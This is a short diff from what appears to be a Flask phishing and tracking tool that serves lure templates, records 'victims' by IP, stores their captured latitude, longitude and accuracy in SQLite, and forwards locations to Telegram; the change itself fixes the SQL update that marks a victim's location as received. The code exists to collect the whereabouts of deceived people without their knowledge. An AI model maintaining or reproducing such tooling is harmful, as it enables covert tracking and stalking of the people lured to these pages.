@@ -361,8 +361,15 @@ def result_handler(tpl_name):
     send_tg(loc_info, 'location')
     
     with sqlite3.connect(DB_FILE) as conn:
-        conn.execute("UPDATE victims SET lat=?, lon=?, acc=?, status=? WHERE ip=? AND template=? ORDER BY id DESC LIMIT 1",
-                     (loc_info['lat'], loc_info['lon'], loc_info['acc'], 'Location received', ip, tpl_name))
+        conn.execute("""
+            UPDATE victims 
+            SET lat=?, lon=?, acc=?, status=? 
+            WHERE id = (
+                SELECT id FROM victims 
+                WHERE ip=? AND template=? 
+                ORDER BY id DESC LIMIT 1
+            )
+        """, (loc_info['lat'], loc_info['lon'], loc_info['acc'], 'Location received', ip, tpl_name))
     return "OK"
 
 @app.route('/t/<tpl_name>/error_handler.php', methods=['POST'])
